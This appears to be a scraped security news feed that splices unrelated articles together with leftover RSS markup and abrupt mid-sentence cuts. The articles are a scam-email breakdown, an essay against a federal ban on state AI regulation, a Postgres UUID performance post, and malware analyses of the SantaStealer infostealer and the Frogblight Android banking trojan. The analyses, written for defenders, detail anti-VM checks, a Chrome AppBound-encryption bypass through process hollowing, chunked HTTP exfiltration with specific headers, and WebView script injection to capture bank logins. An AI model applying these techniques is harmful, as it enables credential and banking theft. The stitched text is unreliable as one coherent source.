listed in suspicious emails or attachments.Beware of someone wanting to connect to your computer remotely. One of the tech support scammer’s biggest weapons is their ability to connect remotely to their victims. If they do this, they essentially have total access to all of your files and folders.If you’ve already fallen victim to a tech support scam:Contact your credit card company or bank and let them know what’s happened. You may also want to file a complaint with the FTC or contact your local law enforcement, depending on your region.If you shared your password with a scammer, change it everywhere it’s used. Consider using a password manager and enable 2FA for important accounts. If scammers had access to your system, they may have planted a backdoor so they can revisit whenever they feel like it. Malwarebytes can remove these and other software left behind by scammers.Keep an eye out for unexpected payments or suspicious charges on your credit cards and bank accounts.Be wary of suspicious emails. If you’ve fallen for one scam, they may target you again.Pro tip: Malwarebytes Scam Guard recognized this email as a scam. Upload any suspicious text, emails, attachments and other files to ask for its opinion. It’s really very good at recognizing scams. Here’s what it reported back for this particular scam:“Suspicious Email AssessmentThis email appears to be a  designed to trick you into contacting scammers via a fake customer service number, a suspicious website, or email address. Here’s a breakdown of key warning signs:Fake or Spoofed Sender AddressWhile it says “service@paypal.com”, sender addresses can be easily spoofed. The real test is the content and behavior of the message, not just the visible address.Links like http://sonyusa.store and [sonyusa.store] (both non-official and unrelated to PayPal or Sony).Official PayPal links always use paypal.com domain.Non-Official Customer Service EmailEmail provided is sony12service@gmail.com instead of an official Sony or PayPal domain.Urgency and Threat of Unauthorized ChargesCreates panic by telling you a large payment was processed and prompts you to act quickly by contacting their “support” number or email.The number provided (805-500-6377) is likely operated by scammers. Real PayPal will never ask you to contact them via generic phone numbers outside of their secure website.Unusual Formatting and GrammarAwkward phrasing and formatting errors are common in scams.”We don’t just report on scams—we help detect themCybersecurity risks should never spread beyond a headline.

The method uses a browser-native prompt that persuades victims to copy and paste a link.

Amidst the many seismic provisions, Senator Ted Cruz dropped a ticking time bomb of tech policy: a ten-year moratorium on the ability of states to regulate artificial intelligence. To many, this was catastrophic. The few massive AI companies seem to be swallowing our economy whole: their energy demands are overriding household needs, their data demands are overriding creators’ copyright, and their products are triggering mass unemployment as well as new types of clinical psychoses. In a moment where Congress is seemingly unable to act to pass any meaningful consumer protections or market regulations, why would we hamstring the one entity evidently capable of doing so—the states? States that have already enacted consumer protections and other AI regulations, like California, and those actively debating them, like Massachusetts, were alarmed. Seventeen Republican governors wrote a letter decrying the idea, and it was ultimately killed in a rare vote of bipartisan near-unanimity.The idea is back. Before Thanksgiving, a House Republican leader suggested they might slip it into the annual defense spending bill. Then, a draft document leaked outlining the Trump administration’s intent to enforce the state regulatory ban through executive powers. An outpouring of opposition (including from some Republican state leaders) beat back that notion for a few weeks, but on Monday, Trump posted on social media that the promised Executive Order is indeed coming soon. That would put a growing cohort of states, including California and New York, as well as Republican strongholds like Utah and Texas, in jeopardy.The constellation of motivations behind this proposal is clear: conservative ideology, cash, and China.The intellectual argument in favor of the moratorium is that “freedom“-killing state regulation on AI would create a patchwork that would be difficult for AI companies to comply with, which would slow the pace of innovation needed to win an AI arms race with China. AI companies and their investors have been aggressively peddling this narrative for years now, and are increasingly backing it with exorbitant lobbying dollars. It’s a handy argument, useful not only to kill regulatory constraints, but also—companies hope—to win federal bailouts and energy subsidies.Citizens should parse that argument from their own point of view, not Big Tech’s. Preventing states from regulating AI means that those companies get to tell Washington what they want, but your state representatives are powerless to represent your own interests. Which freedom is more important to you: the freedom for a few near-monopolies to profit from AI, or the freedom for you and your neighbors to demand protections from its abuses?There is an element of this that is more partisan than ideological. Vice President J.D. Vance argued that federal preemption is needed to prevent “progressive” states from controlling AI’s future. This is an indicator of creeping polarization, where Democrats decry the monopolism, bias, and harms attendant to corporate AI and Republicans reflexively take the opposite side. It doesn’t help that some in the parties also have direct financial interests in the AI supply chain.But this does not need to be a partisan wedge issue: both Democrats and Republicans have strong reasons to support state-level AI legislation. Everyone shares an interest in protecting consumers from harm created by Big Tech companies. In leading the charge to kill Cruz’s initial AI moratorium proposal, Republican Senator Masha Blackburn explained that “This provision could allow Big Tech to continue to exploit kids, creators, and conservatives? we can’t block states from making laws that protect their citizens.” More recently, Florida Governor Ron DeSantis wants to regulate AI in his state.The often-heard complaint that it is hard to comply with a patchwork of state regulations rings hollow. Pretty much every other consumer-facing industry has managed to deal with local regulation—automobiles, children’s toys, food, and drugs—and those regulations have been effective consumer protections. The AI industry includes some of the most valuable companies globally and has demonstrated the ability to comply with differing regulations around the world, including the EU’s AI and data privacy regulations, substantially more onerous than those so far adopted by US states. If we can’t leverage state regulatory power to shape the AI industry, to what industry could it possibly apply?The regulatory superpower that states have here is not size and force, but rather speed and locality. We need the “laboratories of democracy” to experiment with different types of regulation that fit the specific needs and interests of their constituents and evolve responsively to the concerns they raise, especially in such a consequential and rapidly changing area such as AI.We should embrace the ability of regulation to be a driver—not a limiter—of innovation. Regulations don’t restrict companies from building better products or making more profit; they help channel that innovation in specific ways that protect the public interest. Drug safety regulations don’t prevent pharma companies from inventing drugs; they force them to invent drugs that are safe and efficacious. States can direct private innovation to serve the public.But, most importantly, regulations are needed to prevent the most dangerous impact of AI today: the concentration of power associated with trillion-dollar AI companies and the power-amplifying technologies they are producing. We outline the specific ways that the use of AI in governance can disrupt existing balances of power, and how to steer those applications towards more equitable balances, in our new book, Rewiring Democracy. In the nearly complete absence of Congressional action on AI over the years, it has swept the world’s attention; it has become clear that states are the only effective policy levers we have against that concentration of power.Instead of impeding states from regulating AI, the federal government should support them to drive AI innovation. If proponents of a moratorium worry that the private sector won’t deliver what they think is needed to compete in the new global economy, then we should engage government to help generate AI innovations that serve the public and solve the problems most important to people. Following the lead of countries like Switzerland, France, and Singapore, the US could invest in developing and deploying AI models designed as public goods: transparent, open, and useful for tasks in public administration and governance.Maybe you don’t trust the federal government to build or operate an AI tool that acts in the public interest? We don’t either. States are a much better place for this innovation to happen because they are closer to the people, they are charged with delivering most government services, they are better aligned with local political sentiments, and they have achieved greater trust. They’re where we can test, iterate, compare, and contrast regulatory approaches that could inform eventual and better federal policy. And, while the costs of training and operating performance AI tools like large language models have declined precipitously, the federal government can play a valuable role here in funding cash-strapped states to lead this kind of innovation.This essay was written with Nathan E. Sanders, and originally appeared in Gizmodo.]]></content:encoded></item><item><title>ANNOUNCE: A new resource to help small and mid-sized HIPAA-regulated entities</title><link>https://databreaches.net/2025/12/15/announce-a-new-resource-to-help-small-and-mid-sized-hipaa-regulated-entities/?pk_campaign=feed&amp;pk_kwd=announce-a-new-resource-to-help-small-and-mid-sized-hipaa-regulated-entities</link><author>Dissent</author><category>databreach</category><pubDate>Mon, 15 Dec 2025 12:00:07 +0000</pubDate><source url="https://databreaches.net/">Recent Data breaches</source><content:encoded><![CDATA[]]></content:encoded></item><item><title>A Browser Extension Risk Guide After the ShadyPanda Campaign</title><link>https://thehackernews.com/2025/12/a-browser-extension-risk-guide-after.html</link><author>The Hacker News</author><category>security</category><enclosure url="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgAAYMfLInHfns5nX7hk3SOBwCvMca-7usfovrOLFewfHgZtx0972jWlVx8u1MVE0_WqJCnczK6ZFXTZ-ir-grtXiWZcXJw6eGWzTX7supbbmuFOPY2fxfgdqcRAP_dpIW4fGawNEFOdY1wfUVlhaL4lx3_HjP20Ql7NEsL3oVu6s2xceDq0DHz_JyQU2Y/s1600/reco.jpg" length="" type=""/><pubDate>Mon, 15 Dec 2025 11:55:00 +0000</pubDate><source url="https://thehackernews.com/">The Hacker News</source><content:encoded><![CDATA[In early December 2025, security researchers exposed a cybercrime campaign that had quietly hijacked popular Chrome and Edge browser extensions on a massive scale.

Various UUID versions are in the RFC. Version 4 has mostly random bits, obfuscating information like when the value was created or where it was generated.Version 4 UUIDs are easy to generate in Postgres using the  function since version 13 (released in 2020).I’ve learned there are misconceptions about UUID Version 4, and sometimes these are the reasons users pick this data type.Because of the poor performance, misconceptions, and available alternatives, I’ve come around to a simple position: Avoid UUID Version 4 for primary keys.My more controversial take is to avoid UUIDs in general, but I understand there are some legitimate reasons for them without practical alternatives.As a database enthusiast, I wanted to have an articulated position on this classic “Integer v. UUID” debate.Among databases folks, debating this may be tired and clichéd. However, from my consulting work, I can say I work with databases using UUID v4 in 2024 and 2025, and still see the issues discussed in this post.UUID context for this postUUIDs (or GUID in Microsoft speak)) are long strings of 36 characters, 32 digits, 4 hyphens, stored as 128 bits (16 byte) values, stored using the binary  data type in PostgresThe RFC documents how the 128 bits are setThe bits for UUID Version 4 are mostly random valuesUUID Version 7 includes a timestamp in the first 48 bits, which works much better with database indexes compared with random valuesAlthough unreleased as of this writing, and pulled from Postgres 17 previously, UUID V7 is part of Postgres 18 scheduled for release in the Fall of 2025.What kind of app databases are in scope for this post?Scope of web app usage and their scaleThe kinds of web applications I’m thinking of with this post are monolithic web apps, with Postgres as their primary OLTP database. The apps could be in categories like social media, e-commerce, click tracking, or business process automation apps.The types of performance issues discussed here are related to inefficient storage and retrieval, meaning they happen for all of these types of apps.What’s the core issue with UUID v4?The core issue with UUID Version 4, given that the 122 bits they’re made up of are “random or pseudo-randomly generated values”, is how the values are maintained in indexes. Since primary keys are backed by indexes by default, each insert is less efficient compared with inserts for sequentially ordered values.For lookups, each update and delete for individual items or for ranges of items are less efficient, due to increased traversal of non-sequential index pages in Postgres.Since the randomly generated values aren’t inserted sequentially (or in sequential/adjacent pages), it’s less efficient to find them later for updates or deletes. Each of these workload types use the primary key index.UUID v4s don’t have a useful natural ordering that aligns with how they’re stored, and thus both storage and retrieval is less efficient.Later in the post we’ll look at just how many more Postgres pages need to be accessed for equivalent data, and what that means in terms of performance.Despite the inefficiencies, UUID v4s and UUIDs in general remain (or at least were) popular in the last decade based on my experience consulting in Postgres.Given the popularity, what use cases for UUID are there?Why choose UUIDs at all? Generating values from one or more client applicationsOne use case for UUIDs is when there’s a need to generate an identifier on a client or from multiple services, then passed to Postgres for persistence.For web apps, generally they instantiate objects in memory and don’t expect an identifier to be used for lookups until after an instance is persisted as a row (where the database generates the identifier).In a microservices architecture where the apps have their own databases, the ability to generate identifiers from each database without collisions is a use case for UUIDs. The UUID could also identify the database a value came from later, vs. an integer.For collision avoidance (see HN discussion), we can’t practically make the same guarantee with sequence-backed integers. There are hacks, like generating even and odd integers between two instances, or using different ranges in the int8 range.There are also alternative identifiers like using composite primary keys (CPKs), however the same set of 2 values wouldn’t uniquely identify a particular table.The avoidance of collisions is described this way on Wikipedia:The number of random version-4 UUIDs which need to be generated in order to have a 50% probability of one collision: 2.71 quintillionThis number would be equivalent to:Generating 1 billion UUIDs per second for about 86 years.Misconceptions: UUIDs are secureOne misconception about UUIDs is that they’re secure. However, the RFC describes that they shouldn’t be considered secure “capabilities.”From RFC 4122 Section 6 Security Considerations:Do not assume that UUIDs are hard to guess; they should not be used
  as security capabilitiesHow can we create obfuscated codes from integers?Creating obfuscated values using integersWhile UUID V4s obfuscate their creation time, the values can’t be ordered to see when they were created relative to each other. We can  achieve those properties with integers with a little more work.One option is to generate a pseudo-random code from an integer, then use that value externally, while still using integers internally.To see the full details of this solution, please check out: Short alphanumeric pseudo random identifiers in PostgresConvert a decimal integer like “2” into binary bits. E.g. a 4 byte, 32 bit integer: 00000000 00000000 00000000 00000010Perform an exclusive OR (XOR) operation on all the bits using a keyEncode each bit using a base62 alphabetThe obfuscated id is stored in a generated column. By reviewing the generated values, they are similar, but aren’t ordered by their creation order.The values in insertion order were , , then .With alphabetical order, the last two would be flipped:  first, then  second, then  third, sorting on the fifth character.If I wanted to use this approach for all tables, I’d try a centralized table that was polymorphic, storing a record for each table that’s using a code (and a foreign key constraint).That way I’d know where the code was used.Why else might we want to skip UUIDs?Reasons against UUIDs in general: they consume a lot of spaceUUIDs are 16 bytes (128 bits) per value, which is double the space of bigint (8 bytes), or quadruple the space of 4-byte integers. This extra space adds up once many tables have millions of rows, and copies of a database are being moved around as backups and restores.A more considerable impact to performance though is the poor characteristics of writing and reading random data into indexes.Reasons against: UUID v4s add insert latency due to index page splits, fragmentationFor random UUID v4s, Postgres incurs more latency for every insert operation.For integer primary key rows, their values are maintained in index pages with “append-mostly” operations on “leaf nodes,” since their values are orderable, and since B-Tree indexes store entries in sorted order.For UUID v4s, primary key values in B-Tree indexes are problematic.Inserts are not appended to the right most leaf page. They are placed into a random page, and that could be mid-page or an already-full page, causing a page split that would have been unnecessary with an integer.Planet Scale has a nice visualization of index page splits and rebalancing.Unnecessary splits and rebalancing add space consumption and processing latency to write operations. This extra IO shows up in Write Ahead Log (WAL) generation as well.Given fixed size pages, we want high density within the pages. Later on we’ll use  to check the average leaf density between integer and UUID to help compare the two.Excessive IO for lookups even with orderable UUIDsB-Tree page layout means you can fit fewer UUIDs per 8KB page. Since we have the limitation of fixed page sizes, we at least want them to be as densely packed as possible.Since UUID indexes are ~40% larger in leaf pages than bigint (int8) for the same logical number of rows, they can’t be as densely packed with values. As Lukas says, “All in all, the physical data structure matters as much as your server configuration to achieve the best I/O performance in Postgres.”This means that for individual lookups, range scans, or UPDATES, we will incur ~40% more I/O on UUID indexes, as more pages are scanned. Remember that even to access one row, in Postgres the whole page is accessed where the row is, and copied into a shared memory buffer.Let’s insert and query data and take a look at numbers between these data types.Working with integers, UUID v4, and UUID v7Let’s create integer, UUID v4, and UUID v7 fields, index them, load them into the buffer cache with .On my Mac, I compiled the  extension. Once compiled and enabled for Postgres, I could use the extension functions to generate UUID V7 values.Another extension  is used. It’s a module included with Postgres, so it just needs to be enabled per database where it’s used.The difference in latency and the enormous difference in buffers from the post was reproducible in my testing.“Holy behemoth buffer count batman”
27,332 buffer hits, index only scan on the  column8,562,960 buffer hits, index only scan on the UUID V4 index scanSince these are buffer  we’re accessing them from memory, which is faster than disk. We can focus then on only the difference in latency based on the data types.How many more pages are accessed for the UUID index? 8,535,628 (8.5 million!) more 8KB pages were accessed, a 31229.4% increase. In terms of MB and MB/s that is:68,285,024 MB or ~68.3 GB! more data that’s accessedCalculating a low and high estimate of access speeds for memory:Accessing 68.3 GB of data from memory ( in PostgreSQL) would add:~3.4 seconds of latency (low speed)~0.86 seconds of latency (high speed)That’s between ~1 and ~3.4 seconds of additional latency solely based on the data type. Here we used 10 million rows and performed 1 million updates, but the latencies will get worse as data and query volumes increase.Inspecting density with the pageinspect extensionWe can inspect the average fill percentage (density) of leaf pages using the  extension.The uuid_experiments/page_density.sql (andyatkinson/pg_scripts PR #20) query in the repo gets the indexes for the integer and v4 and v7 uuid columns, their total page counts, their page stats, and the number of leaf pages.Using the leaf pages, the query calculates an average fill percentage.After performing the 1 million updates on the 10 million rows mentioned in the example, I got these results from that query:This shows the  index had an average fill percentage of nearly 98%, while the UUID v4 index was around 79%.UUID Downsides: Worse cache hit ratioThe Postgres buffer cache is a critical part of good performance.For good performance, we want our queries to produce cache “hits” as much as possible.The buffer cache has limited space. Usually 25-40% of system memory is allocated to it, and the total database size including table and index data is usually much larger than that amount of memory. That means we’ll have trade-offs, as all data will not fit into system memory. This is where the challenges come in!When pages are accessed they’re copied into the buffer cache as buffers. When write operations happen, buffers are dirtied before being flushed.Since the UUIDs are randomly located, additional buffers will need to be copied to the cache compared to ordered integers. Buffers might be evicted to make space that are needed, decreasing hit rates.Mitigations: Rebuilding indexes with UUID valuesSince the tables and indexes are more likely to be fragmented, it makes sense to rebuild the tables and indexes periodically.Rebuilding tables can be done using pg_repack, pg_squeeze, or  if you can afford to perform the operation offline.Indexes can be rebuilt online using .While the newly laid out data in pages, they will still not have correlation, and thus not be smaller. The space formerly occupied by deletes will be reclaimed for reuse though.Mitigation: Shared buffers and work_mem memory sizingIf possible, size your primary instance to have 4x the amount of memory of your size of database. In order words if your database is 25GB, try and run a 128GB memory instance.This gives around 32GB to 50GB of memory for buffer cache () which is hopefully enough to store all accessed pages and index entries.Use  to inspect the contents, and  to populate tables into it.One tactic I’ve used when working with UUID v4 random values where sorting is happening, is to provide more memory to sort operations.To do that in Postgres, we can change the  setting. This setting can be changed for the whole database, a session, or even for individual queries.Mitigation in Rails: UUID and implicit order column Active RecordWhen ORDER BY is generated in queries implicitly, it may be worth ordering on a different high cardinality field that’s indexed, like a  timestamp field.Cluster on a column that’s high cardinality and indexed could be a mitigation option.For example, imagine your UUID primary table has a  timestamp column that’s indexed with , and clustering on that.I don’t see CLUSTER used ever really though as it takes an access exclusive lock. The CLUSTER is a one-time operation that would also need to be repeated regularly to maintain its benefits.For new databases that  be small, with unknown growth, I recommend plain old integers and an identity column (backed by a sequence) for primary keys. These are signed 32 bit (4-byte) values. This provides about 2 billion positive unique values per table.For many business apps, they will never reach 2 billion unique values per table, so this will be adequate for their entire life. I’ve also recommended always using bigint/int8 in other contexts.I guess it comes down to what you know about your data size, how you can project growth. There are plenty of low growth business apps out there, in constrained industries, and constrained sets of business users.For Internet-facing consumer apps with expected high growth, like social media, click tracking, sensor data, telemetry collection types of apps, or when migrating an existing medium or large database with 100s of millions or billions of rows, then it makes sense to start with  (int8), 64-bit, 8-byte integer primary keys.UUID v4 alternatives: Use time-ordered UUIDs like Version 7Since Postgres 18 is not yet released, generating UUID V7s now in Postgres is possible using the  extension.If you have an existing UUID v4 filled database and can’t afford a costly migration to another primary key data type, then starting to populate new values using UUID v7 will help somewhat.Fortunately the binary  data type in Postgres can be used whether you’re storing V4 or V7 UUID values.Another alternative that relies on an extension is .UUID v4s increase latency for lookups, as they can’t take advantage of fast ordered lookups in B-Tree indexesFor new databases, don’t use  for primary key types, which generates random UUID v4 valuesUUIDs consume twice the space of UUID v4 values are not meant to be secure per the UUID RFCUUID v4s are random. For good performance, the whole index must be in buffer cache for index scans, which is increasingly unlikely for bigger data.UUID v4s cause more page splits, which increase IO for writes with increased fragmentation, and increased size of WAL logsFor non-guessable, obfuscated pseudo-random codes, we can generate those from integers, which could be an alternative to using UUIDsIf you must use UUIDs, use time-orderable UUIDs like UUID v7Do you see any errors or have any suggested improvements?

This means the stealer is now deemed production-ready by the developers and can be expected in the wild. Below is a screenshot of the original message in Russian as well as our translation to English.Figure 0: A message announcing the release of SantaStealer in Russian (left) and our translation to English (right)Rapid7 Labs has identified a new malware-as-a-service information stealer being actively promoted through Telegram channels and on underground hacker forums. The stealer is advertised under the name “SantaStealer” and is planned to be released before the end of 2025. Open source intelligence suggests that it recently underwent a rebranding from the name “BluelineStealer.”The malware collects and exfiltrates sensitive documents, credentials, wallets, and data from a broad range of applications, and aims to operate entirely in-memory to avoid file-based detection. Stolen data is then compressed, split into 10 MB chunks, and sent to a C2 server over unencrypted HTTP.While the stealer is advertised as “fully written in C”, featuring a “custom C polymorphic engine” and being “fully undetected,” Rapid7 has found unobfuscated and unstripped SantaStealer samples that allow for an in-depth analysis. These samples can shed more light on this malware’s true level of sophistication.In early December 2025, Rapid7 identified a Windows executable triggering a generic infostealer detection rule, which we usually see triggered by samples from the Raccoon stealer family. Initial inspection of the sample (SHA-256 beginning with 1a27…) revealed a 64-bit DLL with over 500 exported symbols (all bearing highly descriptive names such as “payload_main”, “check_antivm” or “browser_names”) and a plethora of unencrypted strings that clearly hinted at credential-stealing capabilities.While it is not clear why the malware authors chose to build a DLL, or how the stealer payload was to be invoked by a potential stager, this choice had the (presumably unintended) effect of including the name of every single function and global variable not declared as static in the executable’s export directory. Even better, this includes symbols from statically linked libraries, which we can thus identify with minimal effort.The statically linked libraries in this particular DLL include:cJSON, an “ultralightweight JSON parser”miniz, a “single C source file zlib-replacement library”sqlite3, the C library for interfacing with SQLite v3Another pair of exported symbols in the DLL are named notes_config_size and notes_config_data. These point to a string containing the JSON-encoded stealer configuration, which contains, among other things, a banner (“watermark”) with Unicode art spelling “SANTA STEALER” and a link to the stealer Telegram channel, t[.]me/SantaStealer.Visiting SantaStealer’s Telegram channel, we observed the affiliate web panel, where we were able to register an account and access more information provided by the operators, such as a list of features, the pricing model, or the various build configuration options. This allowed us to cross-correlate information from the panel with the configuration observed in samples, and get a basic idea of the ongoing evolution of the stealer.Apart from Telegram, the stealer can be found advertised also on the Lolz hacker forum at lolz[.]live/santa/. The use of this Russian-speaking forum, the top-level domain name of the web panel bearing the country code of the Soviet Union (su), and the ability to configure the stealer not to target Russian-speaking victims (described later) hints at Russian citizenship of the operators — not at all unusual on the infostealer market.As the above screenshot illustrates, the stealer operators have ambitious plans, boasting anti-analysis techniques, antivirus software bypasses, and deployment in government agencies or complex corporate networks. This is reflected in the pricing model, where a basic variant is advertised for $175 per month, and a premium variant is valued at $300 per month, as captured in the following screenshot.In contrast to these claims, the samples we have seen until now are far from undetectable, or in any way difficult to analyze. While it is possible that the threat actor behind SantaStealer is still developing some of the mentioned anti-analysis or anti-AV techniques, having samples leaked before the malware is ready for production use — complete with symbol names and unencrypted strings — is a clumsy mistake likely thwarting much of the effort put into its development and hinting at poor operational security of the threat actor(s).Interestingly, the web panel includes functionality to “scan files for malware” (i.e. check whether a file is being detected or not). While the panel assures the affiliate user that no files are shared and full anonymity is guaranteed, one may have doubts about whether this is truly the case.Some of the build configuration options within the web panel are shown in Figures 7 through 9.One final aspect worth pointing out is that, rather unusually, the decision whether to target countries in the Commonwealth of Independent States (CIS) is seemingly left up to the buyer and is not hardcoded, as is often the case with commercial infostealers.Technical analysis of SantaStealerHaving read the advertisement of SantaStealer’s capabilities by the developers, one might be interested in seeing how they are implemented on a technical level. Here, we will explore one of the EXE samples (SHA-256 beginning with 926a…), as attempts at executing the DLL builds with rundll32.exe ran into issues with the C runtime initialization. However, the DLL builds (such as SHA-256 beginning with 1a27…) are still useful for static analysis and cross-referencing with the EXE.At the moment, detecting and tracking these payloads is straightforward, due to the fact that both the malware configuration and the C2 server IP address are embedded in the executable in plain text. However, if SantaStealer indeed does turn out to be competitive and implements some form of encryption, obfuscation, or anti-analysis techniques (as seen with Lumma or Vidar) these tasks may become less trivial for the analyst. A deeper understanding of the patterns and methods utilized by SantaStealer may be beneficial.The user-defined entry point in the executable corresponds to the payload_main DLL export. Within this function, the stealer first checks the anti_cis and exec_delay_seconds values from the embedded config and behaves accordingly. If the CIS check is enabled and a Russian keyboard layout is detected using the GetKeyboardLayoutList API, the stealer drops an empty file named “CIS” and ends its execution. Otherwise, SantaStealer waits for the configured number of seconds before calling functions named check_antivm, payload_credentials, create_memory_based_log and creating a thread running the routine named ThreadPayload1 in the DLL exports.The anti-VM function is self-explanatory, but its implementation differs across samples, hinting at the ongoing development of the stealer. One sample checks for blacklisted processes (by hashing the names of running process executables using a custom rolling checksum and searching for them in a blacklist), suspicious computer names (using the same method) and an “analysis environment,” which is just a hard-coded blacklist of working directories, like “C:\analysis” and similar. Another sample checks the number of running processes, the system uptime, the presence of a VirtualBox service (by means of a call to OpenServiceA with "VBoxGuest") and finally performs a time-based debugger check. In either case, if a VM or debugger is detected, the stealer ends its execution.Next, payload_credentials attempts to steal browser credentials, including passwords, cookies, and saved credit cards. For Chromium-based browsers, this involves bypassing a mechanism known as AppBound Encryption (ABE). For this purpose, SantaStealer embeds an additional executable, either as a resource or directly in section data, which is either dropped to disk and executed (screenshot below), or loaded and executed in-memory, depending on the sample.The extracted executable, in turn, contains an encrypted DLL in its resources, which is decrypted using two consecutive invocations of ChaCha20 with two distinct pairs of 32-byte key and 12-byte nonce. This DLL exports functions called ChromeElevator_Initialize, ChromeElevator_ProcessAllBrowsers and ChromeElevator_Cleanup, which are called by the executable in that order. Based on the symbol naming, as well as usage of ChaCha20 encryption for obfuscation and presence of many recognizable strings, we assess with moderate confidence that this executable and DLL are heavily based on code from the "ChromElevator" project (https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption), which employs direct syscall-based reflective process hollowing to inject code into the target browser. Hijacking the security context of a legitimate browser process this way allows the attacker to decrypt AppBound encryption keys and thereby decrypt stored credentials.The next function called from main, create_memory_based_log, demonstrates the modular design of the stealer. For each included module, it creates a thread running the module_thread routine with an incremented numerical ID for that module, starting at 0. It then waits for 45 seconds before joining all thread handles and writing all files collected in-memory into a ZIP file named “Log.zip” in the TEMP directory.The module_thread routine simply takes the index it was passed as parameter and calls a handler function at that index in a global table, for some reason called memory_generators in the DLL. The module function takes only a single output parameter, which is the number of files it collected. In the so helpfully annotated DLL build, we can see 14 different modules. Besides generic modules for reading environment variables, taking screenshots, or grabbing documents and notes, there are specialized modules for stealing data from the Telegram desktop application, Discord, Steam, as well as browser extensions, histories and passwords.Finally, after all the files have been collected, ThreadPayload1 is run in a thread. It sleeps for 15 seconds and then calls payload_send, which in turn calls send_zip_from_memory_0, which splits the ZIP into 10 MB chunks that are uploaded using send_upload_chunk.The file chunks are exfiltrated over plain HTTP to an /upload endpoint on a hard-coded C2 IP address on port 6767, with only a couple special headers:User-Agent: upload
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary[...]
auth: [...]
w: [...]
complete: true (only on final request)The auth header appears to be a unique build ID, and w is likely the optional “tag” used to distinguish between campaigns or “traffic sources”, as is mentioned in the features.The SantaStealer malware is in active development, set to release sometime in the remainder of this month or in early 2026. Our analysis of the leaked builds reveals a modular, multi-threaded design fitting the developers’ description. Some, but not all, of the improvements described in SantaStealer’s Telegram channel are reflected in the samples we were able to analyze. For one, the malware can be seen shifting to a completely fileless collection approach, with modules and the Chrome decryptor DLL being loaded and executed in-memory. On the other hand, the anti-analysis and stealth capabilities of the stealer advertised in the web panel remain very basic and amateurish, with only the third-party Chrome decryptor payload being somewhat hidden.To avoid getting infected with SantaStealer, it is recommended to pay attention to unrecognized links and e-mail attachments. Watch out for fake human verification, or technical support instructions, asking you to run commands on your computer. Finally, avoid running any kind of unverified code from sources such as pirated software, videogame cheats, unverified plugins, and extensions.Stay safe and off the naughty list!Customers using Rapid7’s Intelligence Hub gain direct access to SantaStealer IOCs, along with ongoing intelligence on new activity and related campaigns.

Initially, the malware was disguised as an app for accessing court case files via an official government webpage. Later, more universal disguises appeared, such as the Chrome browser.Frogblight can use official government websites as an intermediary step to steal banking credentials. Moreover, it has spyware functionality, such as capabilities to collect SMS messages, a list of installed apps on the device and device filesystem information. It can also send arbitrary SMS messages.Another interesting characteristic of Frogblight is that we’ve seen it updated with new features throughout September. This may indicate that a feature-rich malware app for Android is being developed, which might be distributed under the MaaS model.This threat is detected by Kaspersky products as HEUR:Trojan-Banker.AndroidOS.Frogblight.*, HEUR:Trojan-Banker.AndroidOS.Agent.eq, HEUR:Trojan-Banker.AndroidOS.Agent.ep, HEUR:Trojan-Spy.AndroidOS.SmsThief.de.While performing an analysis of mobile malware we receive from various sources, we discovered several samples belonging to a new malware family. Although these samples appeared to be still under development, they already contained a lot of functionality that allowed this family to be classified as a banking Trojan. As new versions of this malware continued to appear, we began monitoring its development. Moreover, we managed to discover its control panel and based on the “fr0g” name shown there, we dubbed this family “Frogblight”.We believe that smishing is one of the distribution vectors for Frogblight, and that the users had to install the malware themselves. On the internet, we found complaints from Turkish users about phishing SMS messages convincing users that they were involved in a court case and containing links to download malware. versions of Frogblight, including the very first ones, were disguised as an app for accessing court case files via an official government webpage and were named the same as the files for downloading from the links mentioned above.While looking for online mentions of the names used by the malware, we discovered one of the phishing websites distributing Frogblight, which disguises itself as a website for viewing a court file.The phishing website distributing FrogblightWe were able to open the admin panel of this website, where it was possible to view statistics on Frogblight malware downloads. However, the counter had not been fully implemented and the threat actor could only view the statistics for their own downloads.The admin panel interface of the website from which Frogblight is downloadedAdditionally, we found the source code of this phishing website available in a public GitHub repository. Judging by its description, it is adapted for fast deployment to Vercel, a platform for hosting web apps.The GitHub repository with the phishing website source codeAs already mentioned, Frogblight was initially disguised as an app for accessing court case files via an official government webpage. Let’s look at one of the samples using this disguise (9dac23203c12abd60d03e3d26d372253). For analysis, we selected an early sample, but not the first one discovered, in order to demonstrate more complete Frogblight functionality.After starting, the app prompts the victim to grant permissions to send and read SMS messages, and to read from and write to the device’s storage, allegedly needed to show a court file related to the user.The full list of declared permissions in the app manifest file is shown below:BIND_ACCESSIBILITY_SERVICEFOREGROUND_SERVICE_DATA_SYNCREQUEST_IGNORE_BATTERY_OPTIMIZATIONSAfter all required permissions are granted, the malware opens the official government webpage for accessing court case files in WebView, prompting the victim to sign in. There are different sign-in options, one of them via online banking. If the user chooses this method, they are prompted to click on a bank whose online banking app they use and fill out the sign-in form on the bank’s official website. This is what Frogblight is after, so it waits two seconds, then opens the online banking sign-in method regardless of the user’s choice. For each webpage that has finished loading in WebView, Frogblight injects JavaScript code allowing it to capture user input and send it to the C2 via a REST API.The malware also changes its label to “Davalarım” if the Android version is newer than 12; otherwise it hides the icon.
In the sample we review in this section, Frogblight uses a REST API for C2 communication, implemented using the Retrofit library. The malicious app pings the C2 server every two seconds in foreground, and if no error is returned, it calls the REST API client methods  and getFileCommands. Other methods are called when specific events occur, for example, after the device screen is turned on, the com.capcuttup.refresh.PersistentService foreground service is launched, or an SMS is received. The full list of all REST API client methods with parameters and descriptions is shown below.Request message content to be sent via SMS or displayed in a notificationdevice_id: unique Android device IDSend the results of processing a message received after calling the API method fetchOutboxdevice_id: unique Android device ID

thumbnails: thumbnailsRemote device control, persistence, and protection against deletionThe app includes several classes to provide the threat actor with remote access to the infected device, gain persistence, and protect the malicious app from being deleted.capcuttup.refresh.AccessibilityAutoClickService
This is intended to prevent removal of the app and to open websites specified by the threat actor in WebView upon target apps startup. It is present in the sample we review, but is no longer in use and deleted in further versions.capcuttup.refresh.PersistentService
This is a service whose main purpose is to interact with the C2 and to make malicious tasks persistent.capcuttup.refresh.BootReceiver
This is a broadcast receiver responsible for setting up the persistence mechanisms, such as job scheduling and setting alarms, after device boot completion.In later versions, new functionality was added, and some of the more recent Frogblight variants disguised themselves as the Chrome browser. Let’s look at one of the fake Chrome samples (d7d15e02a9cd94c8ab00c043aef55aff).In this sample, new REST API client methods have been added for interacting with the C2.Get commands to perform actions with contacts
Available commands:
●       ADD_CONTACT: add a contact to the user device
●       DELETE_CONTACT: delete a contact from the user device
